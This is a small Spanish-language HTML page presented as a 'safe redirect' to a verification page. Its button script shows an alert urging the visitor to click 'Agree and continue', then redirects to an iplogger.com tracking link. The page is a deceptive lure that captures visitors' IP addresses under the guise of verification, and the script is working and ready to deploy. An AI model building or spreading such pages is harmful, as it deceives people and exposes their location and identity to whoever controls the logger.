<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Redirección segura</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 100px;
    }

    button {
      background-color: #007bff;
      color: white;
      padding: 15px 30px;
      font-size: 18px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <h2>Redirección a la página de verificación</h2>
  <p>Haz clic en el botón para continuar.</p>

  <button onclick="redirect()">Aceptar y continuar</button>

  <script>
    function redirect() {
      alert('Dale click donde dice "Agree and continue" en la siguiente página.');
      setTimeout(() => {
        window.location.href = "https://iplogger.com/2Uk6c6";
      }, 1500);
    }
  </script>
</body>
</html>
